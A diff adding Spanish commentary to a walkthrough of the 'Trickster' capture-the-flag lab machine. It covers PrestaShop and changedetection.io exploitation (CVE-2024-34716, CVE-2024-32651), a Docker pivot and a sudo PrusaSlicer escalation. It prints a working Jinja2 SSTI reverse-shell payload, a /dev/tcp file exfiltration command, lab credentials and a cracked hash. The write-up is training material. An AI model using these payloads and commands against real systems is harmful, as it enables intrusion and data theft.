@@ -19,9 +19,13 @@ layout:
 
 
 
+<figure><img src="../../.gitbook/assets/Trickster.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`Trickster`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.34 -oG allPorts
@@ -36,7 +40,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -49,7 +53,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página de `Apache`y el servicio de SSH.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.34 -A -oN targeted -oX targetedXML
@@ -82,7 +86,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
 ```
 
-
+Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -91,35 +95,35 @@ Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+Añadiremos en nuestro archivo `/etc/hosts` la siguiente entrada.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.34
 10.10.11.34 trickster.htb
 ```
 
-
-
 ## Web Enumeration
 
-
+Accederemos a [http://trickster.htb](http://trickster.htb), haciendo **hovering** sobre los enlaces, visualizamos que hay uno de ellos que nos lleva a un subdominio de la página llamado `show.trickster.htb`.
 
 <figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.34
 10.10.11.34 trickster.htb shop.trickster.htb
 ```
 
-
+Accederemos a [http://shop.trickster.htb](http://shop.trickster.htb) y nos encontramos con la siguiente página web, de una tienda de ropa.
 
 <figure><img src="../../.gitbook/assets/imagen (2).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizarmeos una enumeración del sitio web a través de la herramienta de `dirsearch`. En el resultado obtenido, nos encontramos que al parecer está una carpeta de `/.git/` expuesta.
 
 ```bash
 ❯ dirsearch -u 'http://shop.trickster.htb/' -i 200 -t 50 2>/dev/null
@@ -150,17 +154,15 @@ Target: http://shop.trickster.htb/
 
 ### Downloading Git Folder disclosure (GitHack)
 
+Accederemos a [http://shop.trickster.htb/.git/](http://shop.trickster.htb/.git/) para verificar si disponemos del acceso correctamente.
 
+<figure><img src="../../.gitbook/assets/imagen (3).png" alt="" width="419"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
-
-
+Accediendo a un directorio de **Logs**, nos encontramos con el siguiente archivo el cual mencionan que se realizó un Update del panel de Administración.
 
 <figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+A través de la herramienta de `GitHack`,  nos descargaremos el contenido de la carpeta `/.git/` en nuestro equipo local. En el resultado obtenido, obtenemos el nombre de un directorio que empieza por admin.
 
 ```bash
 ❯ python3 /opt/GitHack/GitHack.py http://shop.trickster.htb/.git/ 2>/dev/null
@@ -180,21 +182,23 @@ drwxrwxr-x kali kali 4.0 KB Fri Jan 24 23:49:55 2025  admin634ewutrx1jgitlooa
 .rw-rw-r-- kali kali 863 B  Fri Jan 24 23:49:52 2025  Makefile
 ```
 
+Si probamos de acceder a [http://shop.trickster.htb/admin634ewutrx1jgitlooaj](http://shop.trickster.htb/admin634ewutrx1jgitlooaj), nos encontramos con el siguiente panel de inicio de sesión. También se nos indica la versión de `PrestaShop`.
 
+{% hint style="info" %}
+PrestaShop es una plataforma gratuita de código abierto diseñada específicamente para crear y administrar comercios electrónicos. En concreto, Prestashop es un CMS (Content Management System), es decir, un sistema de gestión de contenidos web como lo son, por ejemplo, WordPress, Joomla o Magento
+{% endhint %}
 
-
-
-<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>
-
-
+<figure><img src="../../.gitbook/assets/imagen (5).png" alt="" width="563"><figcaption></figcaption></figure>
 
 ## Initial Foothold
 
-
-
 ### PrestaShop Exploitation - XSS to RCE (CVE-2024-34716)
 
+Realizando una búsqueda por internet de las vulnerabilidades de esta versión de `PrestaShop` nos encontramos con el siguiente repositorio en el cual se aprovecha del CVE original que era un XSS para convertirlo en un RCE y obtener acceso al equipo.
+
 {% embed url="https://github.com/aelmokhtar/CVE-2024-34716" %}
+
+Nos descargaremos el repositorio de GitHub del exploit e instalaremos los requisitos.
 
 ```bash
 ❯ git clone https://github.com/aelmokhtar/CVE-2024-34716; cd CVE-2024-34716
@@ -220,7 +224,9 @@ Requirement already satisfied: idna<2.9,>=2.5 in /usr/local/lib/python2.7/dist-p
 Requirement already satisfied: backports.functools-lru-cache; python_version < "3" in /usr/local/lib/python2.7/dist-packages (from soupsieve>=1.2->beautifulsoup4->-r requirements.txt (line 2)) (1.6.6)
 ```
 
+Lanzaremos el exploit sobre la URL vulnerable de `PrestaShop`, le indicaremos un correo falso, nuestra dirección IP y el `admin-path` que encontramos anteriormente.
 
+Al ejecutar el ataque, logramos obtener acceso al equipo como usuario `www-data`.
 
 ```bash
 ❯ python3 exploit.py --url http://shop.trickster.htb --email 'gzzcoo@trickster.htb' --local-ip 10.10.16.5 --admin-path admin634ewutrx1jgitlooaj
@@ -251,7 +257,7 @@ $ whoami
 www-data
 ```
 
-
+Revisando los diferentes archivos de configuración, nos encontramos con las credenciales de acceso a la base de datos que utiliza `PrestaShop`.
 
 ```bash
 www-data@trickster:~/prestashop/app/config$ cat parameters.php 
@@ -265,15 +271,11 @@ www-data@trickster:~/prestashop/app/config$ cat parameters.php
     'database_password' => 'prest@shop_o',
 ```
 
-
-
 ## Initial Access
-
-
 
 ### Enumerating Database
 
-
+Probaremos de autenticarnos al MySQL con las credenciales obtenidas, al acceder sin problemas logamos visualizar las bases de datos existentes y las tablas.
 
 ```bash
 www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -p
@@ -309,7 +311,7 @@ MariaDB [prestashop]> SHOW TABLES;
 ...[snip]...
 ```
 
-
+Revisaremos el contenido de la tabla `ps_employee`, enla cual aparecen las contraseñas en formato hash.
 
 ```bash
 MariaDB [prestashop]> SELECT * FROM ps_employee;
@@ -322,11 +324,9 @@ MariaDB [prestashop]> SELECT * FROM ps_employee;
 2 rows in set (0.000 sec)
 ```
 
-
-
 ### Cracking Hashes
 
-
+Analizaremos el tipo de hash del cual se trata, y a través de `hashcat` procederemos a intentar crackear el hash. Obtenemos la contraseña del usuario `james` en texto plano.
 
 ```bash
 ❯ hashid '$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm'
@@ -343,11 +343,9 @@ hashcat (v6.2.6) starting
 $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm:alwaysandforever
 ```
 
-
-
 ### Accessing SSH with password cracked
 
-
+Trataremos de acceder mediante SSH con las credenciales obtenidas del usuario`james`. Verificamos que logramos obtener el acceso y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh james@trickster.htb
@@ -356,14 +354,12 @@ Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
 james@trickster:~$ ls
 user.txt
 james@trickster:~$ cat user.txt 
-c4dfa6a95b5d1fff2a95ec5dd2f5ed71
+c4dfa6a95***********************
 ```
-
-
 
 ## Lateral Movement
 
-
+Revisaremos si disponemos de algún puerto interno inusual. En este caso, vemos un puerto 41187, que analizamos y no logramos obtener ningún tipo de información interesante.
 
 ```bash
 james@trickster:/opt/PrusaSlicer$ netstat -ano | grep LISTEN
@@ -375,7 +371,11 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
 ```
 
+Revisando las tarjetas de red del equipo, nos fijamos que tiene una tarjeta de red para `Docker`.
 
+{% hint style="info" %}
+Docker es un software de código abierto utilizado para desplegar aplicaciones dentro de contenedores virtuales. La contenerización permite que varias aplicaciones funcionen en diferentes entornos complejos. Por ejemplo, Docker permite ejecutar el sistema de gestión de contenidos WordPress en sistemas Windows, Linux y macOS sin ningún problema.
+{% endhint %}
 
 ```bash
 james@trickster:/tmp$ ifconfig
@@ -411,15 +411,13 @@ veth6d1f8aa: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-
-
 ### Discovering new hosts and ports (fscan)
 
-
+A través de la herramienta de `fscan`, trataremos de descubrir nuevos hosts de una red y sus puertos expuestos, similar a Nmap pero sirve más para un escaneo inicial rápido y efectivo. No hace falta que sea instalado a diferencia de Nmap.
 
 {% embed url="https://github.com/shadow1ng/fscan" %}
 
-
+Nos descargaremos el binario de `fscan`, levantaremos un servidor web para compartir el binario.
 
 ```bash
 ❯ ls -l fscan
@@ -429,7 +427,7 @@ veth6d1f8aa: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo víctima, nos descargaremos el binario en el equipo y le daremos permisos de ejecución.
 
 ```bash
 james@trickster:/tmp$ wget 10.10.16.5/fscan
@@ -439,7 +437,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 7100304 (6.8M) [application/octet-stream]
 Saving to: ‘fscan’
 
-fscan                                                     100%[==================================================================================================================================>]   6.77M  2.87MB/s    in 2.4s    
+fscan          100%[==============================>]   6.77M  2.87MB/s    in 2.4s    
 
 2025-01-24 23:28:46 (2.87 MB/s) - ‘fscan’ saved [7100304/7100304]
 
@@ -448,7 +446,7 @@ james@trickster:/tmp$ ls -l fscan
 james@trickster:/tmp$ chmod +x fscan
 ```
 
-
+Realizaremos un escaneo de los hosts activos de la red de Docker, en este caso, logramos encontrar un nuevo equipo en la dirección **172.17.0.2**.
 
 ```bash
 james@trickster:/tmp$ ./fscan -h 172.17.0.0/24
@@ -467,9 +465,7 @@ start ping
 (icmp) Target 172.17.0.2      is alive
 ```
 
-
-
-
+Trataremos de enumerar los puertos abiertos del nuevo equipo encontrado, logramos encontrar el puerto 5000.
 
 ```bash
 james@trickster:/tmp$ ./fscan -h 172.17.0.2 -p 1-65535
@@ -490,11 +486,9 @@ start vulscan
 [*] 扫描结束,耗时: 32.150710904s
 ```
 
-
-
 ### SSH Port Forwarding
 
-
+Realizaremos **SSH Port Forwarding** para disponer de acceso al puerto interno desde nuestro equipo local.
 
 ```bash
 ❯ ssh -L 5000:172.17.0.2:5000 james@trickster.htb
@@ -502,33 +496,60 @@ james@trickster.htb's password:
 Last login: Fri Jan 24 23:14:03 2025 from 10.10.16.5
 ```
 
+Accederemos desde nuestro navegador a http://127.0.0.1:8500 y nos lleva a una página de `ChangeDetection`. Ingresaremos las credenciales que disponemos actualmente del usuario `james`. Además, nos aparece la versión de la herramienta.
 
+{% hint style="info" %}
+Changedetection.io es una herramienta avanzada de detección y supervisión de cambios en sitios web que te mantiene informado en tiempo real. Con esta herramienta, puedes rastrear y recibir notificaciones sobre los cambios que se producen en miles de páginas web con facilidad.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>
 
+### ChangeDetection Exploitation manually - Remote Code Execution \[RCE] (CVE-2024-32651)
 
-
-### ChangeDetection Exploitation manually - Remote Code Execution \[RCE] (CVE-2024-326519)
+Realizando una búsqueda en Internet, nos encontramos con el siguiente `CVE-2024-32651`.
 
 {% embed url="https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-32651" %}
 
+{% hint style="danger" %}
+changetection.io es un servicio de detección de cambios de páginas web, seguimiento de sitios web, monitor de reabastecimiento y notificación de código abierto. Hay una inyección de plantilla del lado del servidor (SSTI) en Jinja2 que permite la ejecución remota de comandos en el host del servidor. Los atacantes pueden ejecutar cualquier comando del sistema sin ninguna restricción y podrían usar un shell inverso. El impacto es crítico ya que el atacante puede apoderarse completamente de la máquina servidor. Esto se puede reducir si la detección de cambios está detrás de una página de inicio de sesión, pero la aplicación no lo requiere (no es de forma predeterminada ni obligatorio).
+{% endhint %}
 
+#### Proceso de explotación:
+
+1. **Configuración inicial:**
+   * Levantamos un servidor web en nuestro equipo atacante, con un archivo `index.html` básico como contenido inicial.
+   * Añadimos nuestro sitio web al panel de ChangeDetection.io para que sea monitoreado por la herramienta.
+2. **Aprovechamiento de la vulnerabilidad:**
+   * Modificamos el contenido de `index.html` en nuestro servidor para disparar la detección de cambios.
+   * Inyectamos un payload malicioso en la sección de notificaciones de la herramienta, diseñado para establecer una Reverse Shell.
+3. **Ganar acceso al servidor:**
+   * Al activarse la notificación (cuando se detectan los cambios en la página), el servidor ejecutará nuestro payload, permitiéndonos obtener acceso remoto al sistema.
+
+Esta vulnerabilidad destaca por su gravedad, ya que permite a un atacante tomar control completo de la máquina, comprometiendo toda la infraestructura.
+
+**PoC manual**
+
+Añadiremos nuestra página web en la herramienta.
 
 <figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>
 
-
+Una vez añadida, deberemos configurar las opciones dándole a la opción de **Edit**.
 
 <figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>
 
-
+Especificaremos que realice el chequeo de los cambios de versión de nuestra página web en 30 segundos por ejemplo.
 
 <figure><img src="../../.gitbook/assets/4103_vmware_Zf2Upa4LSy (1).png" alt=""><figcaption></figcaption></figure>
 
+En la sección de **Notifications**, estableceremos las siguientes opciones para que haga una llamada a nuestra página web y el paylaod de la Reverse Shell. Guardaremos los cambios realizados.
 
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.5",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\'') }}
+```
 
 <figure><img src="../../.gitbook/assets/4106_vmware_3GMhmTZOQT.png" alt=""><figcaption></figcaption></figure>
 
-
+Desde nuestro equipo, dispondremos de un archivo `index.html`, levantaremos un servidor web.&#x20;
 
 ```bash
 ❯ ls -l
@@ -538,7 +559,9 @@ Last login: Fri Jan 24 23:14:03 2025 from 10.10.16.5
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Nos pondremos en escucha por el puerto especificado en el payload. Realizaremos un par de modificaciones en el archivo de nuestra página hasta que la herramienta de `ChangeDetection` nos lo detecte.
 
+Una vez nos lo detecte, enviará la notificación con el payload y obtendremos acceso al equipo, que en este caso, se trata del equipo de la red de Docker.
 
 ```bash
 ❯ nc -nlvp 443
@@ -552,15 +575,11 @@ hostname -I
 172.17.0.2 
 ```
 
+### ChangeDetection Exploitation automatic - Remote Code Execution \[RCE] (CVE-2024-32651)&#x20;
 
+Otra de las maneras más sencillas, para realizar la explotación de esta vulnerabilidad, es través del siguiente repositorio. Los otros repositorios que nos encontramos no nos funcionaban correctamente debido a la autenticación al panel de la herramienta, en este nuevo script si nos permite asignar las credenciales de acceso.
 
-### ChangeDetection Exploitation automatic - Remote Code Execution \[RCE] (CVE-2024-326519)&#x20;
-
-
-
-Otra manera mas sencilla
-
-
+{% embed url="https://github.com/evgeni-semenov/CVE-2024-32651" %}
 
 ```bash
 ❯ git clone https://github.com/evgeni-semenov/CVE-2024-32651; cd CVE-2024-32651
@@ -573,7 +592,7 @@ Recibiendo objetos: 100% (15/15), 7.19 KiB | 7.19 MiB/s, listo.
 Resolviendo deltas: 100% (2/2), listo.
 ```
 
-
+Realizaremos la explotación, le indicaremos la URL donde está la herramienta montada, nuestra dirección IP, el puerto donde estará en escucha y la contraseña del acceso al panel de `ChangeDetection`. Verificamos que a través de este sencillo script, logramos obtener acceso al equipo víctima.
 
 ```bash
 ❯ python3 cve-2024-32651.py --url http://127.0.0.1:5000 --ip 10.10.16.5 --port 444 --password alwaysandforever
@@ -593,15 +612,13 @@ hostname -I
 172.17.0.2 
 ```
 
-
-
 ## Privilege Escalation
-
-
 
 ### Docker Breakout
 
+Nos encontramos dentro del contenedor de Docker, el cual queremos encontrar alguna vulnerabilidad, configuración para convertirnos en usuario `root`.
 
+Revisando el directorio raíz `/`, nos encontramos con un directorio llamado `datastore`.
 
 ```bash
 root@a4b9a36ae7ff:/# ls -l
@@ -612,16 +629,16 @@ drwxr-xr-x   2 root root 4096 Sep 13 12:24 boot
 drwxr-xr-x   6 root root 4096 Jan 25 00:06 datastore
 ```
 
+Mirando dentro del directorio, hay un directorio llamado `Backups` que parece ser bastante intersante revisarlo.
 
-
-```
+```bash
 root@a4b9a36ae7ff:/datastore# ls -l
 total 52
 drwxr-xr-x 2 root root  4096 Jan 25 00:16 88e869b2-2f04-4032-bb82-8f53b5b13345
 drwxr-xr-x 2 root root  4096 Aug 31 08:56 Backups
 ```
 
-
+Dentro de esta carpeta, nos encontramos con dos archivos comprmidos de un backup de la herramienta.
 
 ```bash
 root@a4b9a36ae7ff:/datastore/Backups# ls -l
@@ -630,18 +647,20 @@ total 44
 -rw-r--r-- 1 root root 33708 Aug 30 20:25 changedetection-backup-20240830202524.zip
 ```
 
-
+Desde nuestro equipo atacante, nos pondremos en escucha para recibir el `.zip` y analizarlo cómodamente.
 
 ```bash
 ❯ nc -nlvp 443 > changedetection-backup-20240830194841.zip
 listening on [any] 443 ...
+```
 
-----
+Desde la máquina víctima, no disponemos de `nc` para transferir el archivo. Por lo tanto, realizamos un `cat` del archvo y el output lo enviamos a nuestro equipo a través de `/dev/tcp`.
 
+```bash
 root@a4b9a36ae7ff:/datastore/Backups$ cat changedetection-backup-20240830194841.zip > /dev/tcp/10.10.16.5/443
 ```
 
-
+Verificamos que logramos obtener el archivo en nuestro equipo local, descomprimiremos el archivo recibido.
 
 ```bash
 ❯ ls -l changedetection-backup-20240830194841.zip
@@ -657,11 +676,14 @@ Archive:  changedetection-backup-20240830194841.zip
   inflating: url-watches.json 
 ```
 
+Al revisar el contenido del archivo descomprmido, dentro del directorio creado, nos encontramos con un archivo con extensión`.br`. Este tipo de archivos, lo podemos descomprimir con la herramienta de `brotli`.
 
+Al descomprmir este archivo, nos genera el archivo `.txt` que al visualizarlo nos encontramos con las credenciales del usuario `adam`.
 
-```bash
-❯ ls -l
-.rw-r--r-- kali kali 2.5 KB Sat Aug 31 01:47:18 2024  f04f0732f120c0cc84a993ad99decb2c.txt.br
+<pre class="language-bash"><code class="lang-bash">❯ cd b4a8b52d-651b-44bc-bbc6-f9e8c6590103/
+
+<strong>❯ ls -l
+</strong>.rw-r--r-- kali kali 2.5 KB Sat Aug 31 01:47:18 2024  f04f0732f120c0cc84a993ad99decb2c.txt.br
 .rw-r--r-- kali kali  51 B  Sat Aug 31 01:47:18 2024  history.txt
 
 ❯ brotli -d f04f0732f120c0cc84a993ad99decb2c.txt.br
@@ -677,7 +699,7 @@ Archive:  changedetection-backup-20240830194841.zip
 
             Raw Permalink Blame History
 
-                < ? php return array (                                                                                                                                 
+                &#x3C; ? php return array (                                                                                                                                 
                 'parameters' =>                                                                                                                                        
                 array (                                                                                                                                                
                 'database_host' => '127.0.0.1' ,                                                                                                                       
@@ -685,11 +707,17 @@ Archive:  changedetection-backup-20240830194841.zip
                 'database_name' => 'prestashop' ,                                                                                                                      
                 'database_user' => 'adam' ,                                                                                                                            
                 'database_password' => 'adam_admin992' ,     
-```
-
-
+</code></pre>
 
 ### Abusing sudoers privilege (prusaslicer)
+
+Probaremos de acceder con el usuario `adam` y las credenciales encontradas, logramos el acceso.
+
+Al verificar si el usuario disponía de algún permiso de **sudoers**. Nos encontramos que puede ejcutar como `sudo` el binario `/opt/PrusaSlicer/prusaslicer`.
+
+{% hint style="info" %}
+PrusaSlicer es el software de corte para impresoras 3D de Prusa . Básicamente, "corta" un objeto 3D en capas finas y un conjunto de instrucciones que la impresora 3D puede seguir para imprimir el modelo.
+{% endhint %}
 
 ```bash
 james@trickster:~$ su adam
@@ -702,7 +730,7 @@ User adam may run the following commands on trickster:
     (ALL) NOPASSWD: /opt/PrusaSlicer/prusaslicer
 ```
 
-
+Revisando maneras de aprovecharnos de este permiso de **sudoers**, nos encontramos con el siguiente repositorio el cual descargaremos en nuestro equipo local.
 
 {% embed url="https://github.com/suce0155/prusaslicer_exploit" %}
 
@@ -717,7 +745,7 @@ Recibiendo objetos: 100% (25/25), 45.69 KiB | 1.34 MiB/s, listo.
 Resolviendo deltas: 100% (3/3), listo.
 ```
 
-
+Editaremos el archivo `exploit.sh` para establecer nuestra dirección IP de atacante y el puerto desde donde estaremos en escucha. Levantaremos un servidor web para transferir estos archivos al equipo víctima.
 
 ```bash
 ❯ cat exploit.sh
@@ -727,11 +755,12 @@ Resolviendo deltas: 100% (3/3), listo.
 .rw-rw-r-- kali kali  38 KB Sat Jan 25 01:25:28 2025  evil.3mf
 .rw-rw-r-- kali kali  45 B  Sat Jan 25 01:26:02 2025  exploit.sh
 .rw-rw-r-- kali kali 369 B  Sat Jan 25 01:25:28 2025  README.md
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo víctima, nos descargaremos los archivos `exploit.sh` y `evil.3mf`.
 
 ```bash
 adam@trickster:/tmp$ wget 10.10.16.5/exploit.sh
@@ -757,14 +786,14 @@ evil.3mf    100%[================================>]      45  --.-KB/s    in 0s
 2025-01-25 00:27:08 (315 KB/s) - ‘evil.3mf’ saved [39455/39455]
 ```
 
-
+Desde una terminal de nuestro equipo, nos pondremos en escucha por el puerto especificado en el payload para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 444
 listening on [any] 444 ...
 ```
 
-
+Realizaremos la explotación para abusar de este permiso de **sudoers** del binario.
 
 ```bash
 adam@trickster:/tmp$ sudo /opt/PrusaSlicer/prusaslicer -s evil.3mf 
@@ -786,7 +815,7 @@ Also consider enabling brim.
 90 => Exporting G-code to EXPLOIT_0.3mm_{printing_filament_types}_MK4_{print_time}.gcode
 ```
 
-
+Revisamos que hemos logrado obtener acceso al equipo como usuario `root`, ya que es quien lo ha ejecutado al disponer de permisos de `sudo` sobre el binario indicado que ha sido aprovechado para ejecutar la Reverse Shell. Logramos visualizar la flag de **root.txt**.
 
 ```bash
 ❯ nc -nlvp 444
@@ -794,5 +823,5 @@ listening on [any] 444 ...
 connect to [10.10.16.5] from (UNKNOWN) [10.10.11.34] 60656
 root@trickster:/tmp# cat /root/root.txt
 cat /root/root.txt
-1036cb4e3c06fd32f82f02277b0855a4
+1036cb4e3******************
 ```
